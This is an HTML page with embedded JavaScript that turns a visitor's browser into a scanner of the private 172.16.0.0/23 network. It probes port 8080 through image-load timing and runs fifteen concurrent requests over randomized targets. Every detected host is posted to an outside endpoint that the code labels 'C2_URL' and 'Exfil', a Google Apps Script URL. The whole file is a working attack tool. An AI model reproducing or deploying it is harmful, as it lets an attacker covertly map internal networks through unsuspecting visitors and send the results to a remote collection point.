<!DOCTYPE html>
<html>
<head>
    <title>Anomaly Hunter // Async Swarm</title>
    <style>
        body { background: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin-bottom: 10px; animation: flash 0.5s; }
        .stat-line { border-bottom: 1px solid #333; padding: 5px 0; color: #666; display: flex; justify-content: space-between; }
        .highlight { color: #fff; font-weight: bold; }
        #progress-bar { height: 4px; background: #333; margin-top: 10px; width: 100%; }
        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
        @keyframes flash { 0% { background-color: #0f0; color: #000; } 100% { background-color: #002200; color: #0f0; } }
    </style>
</head>
<body>
    <h3>// ANOMALY HUNTER [SWARM MODE] //</h3>
    
    <div class="stat-line">
        <span>TARGET SCOPE:</span>
        <span class="highlight">172.16.0.0/23 (Randomized)</span>
    </div>
    <div class="stat-line">
        <span>STRATEGY:</span>
        <span class="highlight">Img-Tag Timing (Non-Blocking)</span>
    </div>

    <br>
    <div id="status">INITIALIZING SWARM...</div>
    <div id="progress-bar"><div id="progress-fill"></div></div>
    <br>
    
    <div id="results"></div>

    <script>
        // --- CONFIGURATION ---
        var TARGET_PORT = 8080;
        var TIMEOUT = 1500;    // Allow plenty of time for dead hosts to time out naturally
        var CONCURRENCY = 15;  // Higher concurrency is safe with Randomization
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec";

        // --- PREPARE TARGETS ---
        var queue = [];
        [0, 1].forEach(subnet => {
            for(var i=1; i<255; i++) queue.push("172.16." + subnet + "." + i);
        });

        // FISHER-YATES SHUFFLE (CRITICAL FIX)
        // This ensures we hit 1.40 early roughly 50% of the time, 
        // rather than waiting for 300 dead IPs to timeout first.
        for (let i = queue.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [queue[i], queue[j]] = [queue[j], queue[i]];
        }

        var total = queue.length;
        var completed = 0;
        var activeRequests = 0;

        // --- SCANNER LOGIC ---
        function scanNext() {
            if(queue.length === 0) return;
            if(activeRequests >= CONCURRENCY) return;

            var ip = queue.shift();
            activeRequests++;
            
            checkIP(ip).then(() => {
                activeRequests--;
                updateProgress();
                scanNext(); // Keep the chain alive
            });
            
            scanNext(); // Spawn more if concurrency allows
        }

        function checkIP(ip) {
            return new Promise(resolve => {
                var start = performance.now();
                var img = new Image();
                var isDone = false;

                // WRAPPER to handle the result
                var finish = (status) => {
                    if(isDone) return;
                    isDone = true;
                    var time = Math.round(performance.now() - start);

                    // LOGIC: 
                    // Dead IPs (Timeout) = >200ms (usually 1000ms+)
                    // Live IPs (404/200) = <100ms (Your manual check was 6ms)
                    if(time < 150) {
                        reportHit(ip, time);
                    }
                    
                    // Cleanup to free socket
                    img.src = "";
                    img = null;
                    resolve();
                };

                // IMAGE EVENTS
                // Note: Both onload and onerror mean the port is OPEN/REACHABLE.
                // A closed port (RST) or Stealth (Timeout) will fire onerror,
                // but usually with different timing.
                // However, on 'file://', PNA might block onload. 
                // We rely purely on the SPEED of the failure.
                img.onload = () => finish("load"); 
                img.onerror = () => finish("error");

                // TRIGGER
                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();

                // SAFETY TIMEOUT (For truly dead/stealth hosts)
                setTimeout(() => {
                    if(!isDone) finish("timeout");
                }, TIMEOUT);
            });
        }

        // --- REPORTING ---
        function reportHit(ip, latency) {
            var div = document.createElement("div");
            div.className = "success-box";
            div.innerHTML = "<strong>>> ANOMALY DETECTED:</strong> " + ip + " <span style='float:right'>" + latency + "ms</span>";
            document.getElementById('results').appendChild(div);

            // Exfil
            fetch(C2_URL, {
                method: "POST", mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ type: "HIT", ip: ip, ms: latency, date: new Date() })
            });
        }

        function updateProgress() {
            completed++;
            var pct = (completed / total) * 100;
            document.getElementById('progress-fill').style.width = pct + "%";
            document.getElementById('status').innerText = "SCANNING: " + completed + "/" + total;
            
            if(completed >= total) {
                document.getElementById('status').innerText = "SCAN COMPLETE.";
                if(document.getElementById('results').children.length === 0) {
                    document.getElementById('results').innerHTML = "<div style='color:#666'>No targets found matching timing profile (<150ms).</div>";
                }
            }
        }

        // START
        scanNext();

    </script>
</body>
</html>
